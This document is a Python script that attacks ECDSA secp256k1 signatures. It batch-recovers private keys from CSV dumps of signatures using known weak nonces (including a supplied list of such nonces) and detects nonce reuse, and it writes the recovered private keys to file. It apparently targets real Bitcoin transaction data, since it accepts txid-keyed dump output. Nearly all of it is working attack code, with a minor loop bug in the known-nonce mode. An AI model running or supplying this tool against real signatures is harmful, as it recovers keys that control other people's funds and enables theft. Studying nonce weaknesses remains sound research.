#!/usr/bin/env python3
"""
ECDSA Signature Analysis — Extended
Supports:
  1. Public key recovery from (r, s, z)
  2. Nonce reuse attack (two sigs, same r)
  3. Known-nonce attack (private key from known k)
  4. Batch known-k attack from CSV — single k or list of k values from file
  5. Batch nonce-reuse attack from CSV (groups by r value)

Signatures CSV columns: r,s,z[,label]   (hex values, 0x optional)
Nonces file: one hex k value per line, blank lines and # comments ignored

Run:
  python3 ecdsa_analysis.py --known-k    signatures.csv [--k 0x...]
  python3 ecdsa_analysis.py --known-k    signatures.csv --nonces nonces.txt
  python3 ecdsa_analysis.py --nonce-reuse signatures.csv
  python3 ecdsa_analysis.py --recover    signatures.csv
  python3 ecdsa_analysis.py --demo
  python3 ecdsa_analysis.py --gen-sample sample.csv
  python3 ecdsa_analysis.py --gen-nonces nonces.txt
"""

import sys
import csv
import argparse
from hashlib import sha256
from itertools import combinations
from pathlib import Path
from collections import defaultdict
from tqdm import tqdm




# ── secp256k1 ─────────────────────────────────────────────────────────────────
P	= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N	= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx	= 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy	= 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
G	= (Gx, Gy)

# k = 1/2 mod N  — the fee-optimisation nonce (90 leading zero bits in r)
K_FEE	= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A1

# ── elliptic curve primitives ─────────────────────────────────────────────────
def modinv(a, m):
	return pow(a, -1, m)

def point_add(P1, P2):
	if P1 is None: return P2
	if P2 is None: return P1
	x1, y1 = P1
	x2, y2 = P2
	if x1 == x2:
		if y1 != y2: return None
		lam = (3 * x1 * x1 * modinv(2 * y1, P)) % P
	else:
		lam = ((y2 - y1) * modinv(x2 - x1, P)) % P
	x3 = (lam * lam - x1 - x2) % P
	y3 = (lam * (x1 - x3) - y1) % P
	return (x3, y3)

def point_mul(k, point):
	result = None
	addend = point
	while k:
		if k & 1:
			result = point_add(result, addend)
		addend = point_add(addend, addend)
		k >>= 1
	return result

# precompute r for K_FEE once
_K_FEE_R = None
def get_kfee_r():
	global _K_FEE_R
	if _K_FEE_R is None:
		_K_FEE_R = point_mul(K_FEE, G)[0] % N
	return _K_FEE_R

# ── core crypto ───────────────────────────────────────────────────────────────
def privkey_from_known_k(r, s, z, k):
	"""d = (s*k - z) * r^-1 mod N"""
	return ((s * k - z) * modinv(r, N)) % N

def privkey_from_nonce_reuse(r, s1, z1, s2, z2):
	"""
	k  = (z1 - z2) * (s1 - s2)^-1 mod N
	d  = (s1*k - z1) * r^-1 mod N
	Returns (d, k) or (None, None).
	"""
	ds = (s1 - s2) % N
	if ds == 0:
		return None, None
	k = ((z1 - z2) * modinv(ds, N)) % N
	d = ((s1 * k - z1) * modinv(r, N)) % N
	return d, k

def pubkey_from_sig(r, s, z):
	"""Recover candidate public keys (up to 4) from (r, s, z)."""
	candidates = []
	for j in range(2):
		x = (r + j * N) % P
		y_sq = (pow(x, 3, P) + 7) % P
		y = pow(y_sq, (P + 1) // 4, P)
		if pow(y, 2, P) != y_sq:
			continue
		for sign in (y, P - y):
			R_pt	= (x, sign)
			r_inv	= modinv(r, N)
			sR	= point_mul(s, R_pt)
			zG	= point_mul(z, G)
			zG_neg	= (zG[0], (-zG[1]) % P)
			Q	= point_mul(r_inv, point_add(sR, zG_neg))
			if Q:
				candidates.append(Q)
	return candidates

def verify(pub, r, s, z):
	w	= modinv(s, N)
	u1	= (z * w) % N
	u2	= (r * w) % N
	pt	= point_add(point_mul(u1, G), point_mul(u2, pub))
	if pt is None: return False
	return pt[0] % N == r

def pubkey_compressed(point):
	x, y = point
	prefix = '02' if y % 2 == 0 else '03'
	return prefix + format(x, '064x')

def pubkey_uncompressed(point):
	x, y = point
	return '04' + format(x, '064x') + format(y, '064x')


# ── CSV I/O ─────────────────────────────────────────────────────────────────────────────
def iter_csv(path):
	"""
	Streaming CSV parser — yields (row_dict, bytes_read) tuples.
	Columns: r, s, z [, label]   (hex values, 0x optional)
	Also accepts btc_dump.py output (txid, input_index, pubkey, etc.)
	by reading only r/s/z and using txid as label when present.
	"""
	with open(path, newline="", encoding="utf-8") as f:
		fieldnames = None
		i = 0
		bytes_read = 0
		for raw in f:
			bytes_read += len(raw.encode("utf-8"))
			line = raw.rstrip("\n")
			if not line.strip() or line.strip().startswith("#"):
				continue
			if fieldnames is None:
				fieldnames = [h.strip().lower() for h in line.split(",")]
				continue
			parts = line.split(",")
			row = dict(zip(fieldnames, parts))
			try:
				r	= int(row["r"].strip(), 16)
				s	= int(row["s"].strip(), 16)
				z	= int(row["z"].strip(), 16)
				label = (
					row.get("label", "").strip()
					or row.get("txid", "").strip()
					or f"row_{i}"
				)
				yield {"r": r, "s": s, "z": z, "label": label}, bytes_read
				i += 1
			except Exception as e:
				print(f"[!] Skipping row {i}: {e}", file=sys.stderr)
				i += 1

def load_nonces(path):
	"""
	Load candidate k values from a text file.
	One hex value per line. Blank lines and lines starting with # are skipped.
	Returns list of (k_int, label) tuples where label is the original line.
	"""
	nonces = []
	with open(path) as f:
		for lineno, raw in enumerate(f, 1):
			line = raw.strip()
			if not line or line.startswith('#'):
				continue
			try:
				k = int(line, 16)
				if k == 0 or k >= N:
					print(f"[!] Nonces line {lineno}: value out of range, skipping")
					continue
				nonces.append((k, line))
			except ValueError:
				print(f"[!] Nonces line {lineno}: cannot parse '{line}', skipping")
	return nonces

def generate_sample_nonces(path):
	"""Write a sample nonces file with known weak/historical k values."""
	lines = [
		"# Sample nonces file — one hex k per line",
		"# K_FEE: k = 1/2 mod N, produces r with 90 leading zero bits",
		hex(K_FEE),
		"# k = 1  (x-coord of G is r)",
		"0x1",
		"# k = 2",
		"0x2",
		"# k = 12345678  (found in real Bitcoin txs)",
		"0x12345678",
		"# k = N-1  (last valid k)",
		hex(N - 1),
	]
	Path(path).write_text("\n".join(lines) + "\n")
	print(f"[+] Sample nonces file written to {path}")

def open_out_csv(path, fieldnames):
	"""Open output CSV for streaming writes. Returns (file_handle, writer)."""
	f = open(path, 'w', newline='')
	w = csv.DictWriter(f, fieldnames=fieldnames)
	w.writeheader()
	return f, w

# ── attack modes ──────────────────────────────────────────────────────────────
def attack_known_k(csv_path, nonces, out_path):
	"""
	Stream csv_path row by row.
	For each row whose r matches a known nonce, compute and write private key.
	Memory: O(nonces) only — the r->nonces map is small.
	"""
	print(f"\n[*] Known-k attack")
	print(f"    {len(nonces)} nonce(s)\n")

	print("[*] Precomputing r values for all nonces...")
	r_to_nonces = defaultdict(list)
	for k, k_label in nonces:
		r_k = point_mul(k, G)[0] % N
		r_to_nonces[r_k].append((k, k_label))
		print(f"    k={k_label[:18]:20s}  =>  r={hex(r_k)[:18]}...  "
			f"({256 - r_k.bit_length()} leading zero bits)")

	fieldnames = ['label','k_label','k','r','s','z',
		'private_key','pubkey_compressed','pubkey_uncompressed','sig_valid']
	fout, writer = open_out_csv(out_path, fieldnames)

	recovered = 0
	no_match  = 0
	scanned   = 0

	total = Path(csv_path).stat().st_size
	print(f"\n[*] Streaming {csv_path}  ({total} bytes)...")
	last = 0
	with tqdm(total=total, unit='B', unit_scale=True, unit_divisor=1024, desc='known-k') as bar:
		for row, bytes_read in iter_csv(csv_path):
			scanned += 1
			r, s, z, label = row['r'], row['s'], row['z'], row['label']
			bar.update(bytes_read - last)
			last = bytes_read
			if r not in r_to_nonces:
				no_match += 1
				continue
			for k, k_label in r_to_nonces[r]:
				d	= privkey_from_known_k(r, s, z, k)
				pub	= point_mul(d, G)
				valid	= verify(pub, r, s, z)
				if valid:
					recovered += 1
			writer.writerow({
				'label':		label,
				'k_label':		k_label,
				'k':			hex(k),
				'r':			hex(r),
				's':			hex(s),
				'z':			hex(z),
				'private_key':		hex(d),
				'pubkey_compressed':	pubkey_compressed(pub),
				'pubkey_uncompressed':	pubkey_uncompressed(pub),
				'sig_valid':		valid,
			})

	fout.close()
	print(f"\n[+] Scanned   : {scanned}")
	print(f"    Recovered : {recovered}")
	print(f"    No match  : {no_match}")
	print(f"    Output    : {out_path}")

def attack_nonce_reuse(csv_path, out_path):
	"""
	Two-pass streaming nonce-reuse attack.

	Pass 1 — stream entire file, build a compact index:
	    r_index: r -> [(s, z, label), ...]
	Only r values that appear more than once are kept after pass 1.
	Memory: O(duplicate_r_groups) which is tiny in practice
	(Brengel & Rossow found only 1,068 distinct duplicate r values
	 across 647 million sigs).

	Pass 2 — stream again, emit results only for rows in the index.
	Output is written row by row.
	"""
	print(f"\n[*] Nonce-reuse attack  (two-pass streaming)")
	print(f"    Pass 1: building r index from {csv_path}...\n")

	# Pass 1: count r occurrences, keep only those seen > once
	from collections import defaultdict
	total_p1 = Path(csv_path).stat().st_size
	r_count = defaultdict(int)
	last = 0
	with tqdm(total=total_p1, unit='B', unit_scale=True, unit_divisor=1024, desc='pass-1') as bar:
		for row, bytes_read in iter_csv(csv_path):
			bar.update(bytes_read - last)
			last = bytes_read
			r_count[row['r']] += 1

	dup_r = {r for r, c in r_count.items() if c > 1}
	del r_count
	print(f"    {len(dup_r)} distinct r values appear more than once")

	if not dup_r:
		print("[!] No duplicate r values found — no nonce reuse detected.")
		return

	# Pass 2: collect only rows with duplicate r, then attack
	print(f"    Pass 2: collecting duplicate-r rows...")
	r_groups = defaultdict(list)
	total_p2 = Path(csv_path).stat().st_size
	last = 0
	with tqdm(total=total_p2, unit='B', unit_scale=True, unit_divisor=1024, desc='pass-2') as bar:
		for row, bytes_read in iter_csv(csv_path):
			bar.update(bytes_read - last)
			last = bytes_read
			if row['r'] in dup_r:
				r_groups[row['r']].append(
					(row['s'], row['z'], row['label'])
				)

	fieldnames = ['label_1','label_2','r','recovered_k','private_key',
		'pubkey_compressed','pubkey_uncompressed','sig1_valid','sig2_valid']
	fout, writer = open_out_csv(out_path, fieldnames)

	found = 0
	for r, group in r_groups.items():
		for (s1,z1,l1), (s2,z2,l2) in combinations(group, 2):
			if s1 == s2:
				continue
			d, k = privkey_from_nonce_reuse(r, s1, z1, s2, z2)
			if d is None:
				continue
			pub = point_mul(d, G)
			v1  = verify(pub, r, s1, z1)
			v2  = verify(pub, r, s2, z2)
			found += 1
			writer.writerow({
				'label_1':		l1,
				'label_2':		l2,
				'r':			hex(r),
				'recovered_k':		hex(k),
				'private_key':		hex(d),
				'pubkey_compressed':	pubkey_compressed(pub),
				'pubkey_uncompressed':	pubkey_uncompressed(pub),
				'sig1_valid':		v1,
				'sig2_valid':		v2,
			})

	fout.close()
	print(f"\n[+] {found} private key(s) recovered.")
	print(f"    Output: {out_path}")

def attack_pubkey_recovery(csv_path, out_path):
	"""Stream csv_path, recover pubkey candidates row by row."""
	print(f"\n[*] Public key recovery  (streaming {csv_path})\n")

	fieldnames = ['label','r','candidate_index',
		'pubkey_compressed','pubkey_uncompressed',
		'pubkey_x','pubkey_y','sig_valid']
	fout, writer = open_out_csv(out_path, fieldnames)

	scanned = 0
	total = Path(csv_path).stat().st_size
	last = 0
	with tqdm(total=total, unit='B', unit_scale=True, unit_divisor=1024, desc='recover') as bar:
		for row, bytes_read in iter_csv(csv_path):
			bar.update(bytes_read - last)
			last = bytes_read
			r, s, z, label = row['r'], row['s'], row['z'], row['label']
			for i, q in enumerate(pubkey_from_sig(r, s, z)):
				valid = verify(q, r, s, z)
				writer.writerow({
					'label':		label,
					'r':			hex(r),
					'candidate_index':	i,
					'pubkey_compressed':	pubkey_compressed(q),
					'pubkey_uncompressed':	pubkey_uncompressed(q),
					'pubkey_x':		hex(q[0]),
					'pubkey_y':		hex(q[1]),
					'sig_valid':		valid,
				})
			scanned += 1

	fout.close()
	print(f"\n[+] Scanned {scanned} rows. Output: {out_path}")

# ── demo ──────────────────────────────────────────────────────────────────────
def demo():
	print("=" * 64)
	print("DEMO: fee-optimisation k  (k = 1/2 mod N)")
	print("=" * 64)
	k	= K_FEE
	r	= get_kfee_r()
	print(f"k  = {hex(k)}")
	print(f"r  = {hex(r)}")
	print(f"r leading zero bits: {256 - r.bit_length()}")

	d	= 0xDEADBEEFCAFEBABE0000111100002222000033334444555566667777DEADBEEF
	z1	= int(sha256(b"pay alice 1 BTC").hexdigest(), 16)
	z2	= int(sha256(b"pay bob 2 BTC").hexdigest(), 16)
	kinv	= modinv(k, N)
	s1	= (kinv * (z1 + r * d)) % N
	s2	= (kinv * (z2 + r * d)) % N

	print(f"\nSig 1: r={hex(r)}  s={hex(s1)}")
	print(f"Sig 2: r={hex(r)}  s={hex(s2)}")

	d1 = privkey_from_known_k(r, s1, z1, k)
	d2 = privkey_from_known_k(r, s2, z2, k)
	print(f"\n[known-k]  from sig1: d={hex(d1)}  match={d1==d}")
	print(f"[known-k]  from sig2: d={hex(d2)}  match={d2==d}")

	d_nr, k_nr = privkey_from_nonce_reuse(r, s1, z1, s2, z2)
	print(f"\n[nonce-reuse]  k={hex(k_nr)}  match={k_nr==k}")
	print(f"[nonce-reuse]  d={hex(d_nr)}  match={d_nr==d}")

	print("\n" + "=" * 64)
	print("DEMO: pubkey recovery from single sig")
	print("=" * 64)
	pub_real = point_mul(d, G)
	for i, q in enumerate(pubkey_from_sig(r, s1, z1)):
		print(f"  [{i}] {pubkey_compressed(q)}  valid={verify(q,r,s1,z1)}  is_real={q==pub_real}")

def generate_sample_csv(path):
	"""Write a sample CSV using K_FEE so --known-k recovers all keys."""
	import random
	k	= K_FEE
	r	= get_kfee_r()
	kinv	= modinv(k, N)
	lines	= ["r,s,z,label"]
	for i in range(8):
		d_test	= random.randrange(1, N)
		z_test	= int(sha256(f"message_{i}".encode()).hexdigest(), 16)
		s_test	= (kinv * (z_test + r * d_test)) % N
		lines.append(f"{hex(r)},{hex(s_test)},{hex(z_test)},sample_{i}")
	Path(path).write_text("\n".join(lines))
	print(f"[+] Sample CSV written to {path}")
	print(f"    All rows use K_FEE — run with --known-k to recover private keys.")

# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
	ap = argparse.ArgumentParser(
		description="ECDSA secp256k1 analysis: known-k, nonce-reuse, pubkey recovery",
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""
Examples:
  python3 ecdsa_analysis.py --demo
  python3 ecdsa_analysis.py --gen-sample sample.csv
  python3 ecdsa_analysis.py --gen-nonces nonces.txt

  # Single k (default = K_FEE):
  python3 ecdsa_analysis.py --known-k sigs.csv
  python3 ecdsa_analysis.py --known-k sigs.csv --k 0x1

  # List of k values from file (one hex per line):
  python3 ecdsa_analysis.py --known-k sigs.csv --nonces nonces.txt

  python3 ecdsa_analysis.py --nonce-reuse sigs.csv
  python3 ecdsa_analysis.py --recover sigs.csv --out pubkeys.csv
		"""
	)
	ap.add_argument('--demo',		action='store_true',
		help='Run built-in self-test demo')
	ap.add_argument('--gen-sample',	metavar='CSV',
		help='Generate sample signatures CSV (all rows use K_FEE)')
	ap.add_argument('--gen-nonces',	metavar='FILE',
		help='Generate sample nonces file with known weak k values')
	ap.add_argument('--known-k',	metavar='CSV',
		help='Batch known-k private key recovery from signatures CSV')
	ap.add_argument('--nonce-reuse',	metavar='CSV',
		help='Batch nonce-reuse attack — groups rows by r')
	ap.add_argument('--recover',	metavar='CSV',
		help='Batch public key recovery from signatures CSV')
	ap.add_argument('--k',		metavar='HEX',
		default=None,
		help='Single known nonce k (hex). Default when --nonces absent: K_FEE')
	ap.add_argument('--nonces',	metavar='FILE',
		help='File of candidate k values (one hex per line). '
			'Overrides --k. r-matching skips non-matching sigs — fast.')
	ap.add_argument('--out',		metavar='CSV',
		help='Output CSV path (auto-named if omitted)')
	args = ap.parse_args()

	if args.demo:
		demo()
		return

	if args.gen_sample:
		generate_sample_csv(args.gen_sample)
		return

	if args.gen_nonces:
		generate_sample_nonces(args.gen_nonces)
		return

	if args.known_k:
		# Build nonces list from --nonces file or fall back to single --k
		if args.nonces:
			nonces = load_nonces(args.nonces)
			if not nonces:
				print("[!] Nonces file is empty or all lines invalid.")
				sys.exit(1)
			print(f"[+] Loaded {len(nonces)} nonce(s) from {args.nonces}")
		else:
			k_val = int(args.k, 16) if args.k else K_FEE
			nonces = [(k_val, hex(k_val))]

		out = args.out or args.known_k.replace('.csv', '_privkeys.csv')
		attack_known_k(args.known_k, nonces, out)
		return

	if args.nonce_reuse:
		out = args.out or args.nonce_reuse.replace('.csv', '_recovered.csv')
		attack_nonce_reuse(args.nonce_reuse, out)
		return

	if args.recover:
		out = args.out or args.recover.replace('.csv', '_pubkeys.csv')
		attack_pubkey_recovery(args.recover, out)
		return

	ap.print_help()

if __name__ == '__main__':
	main()
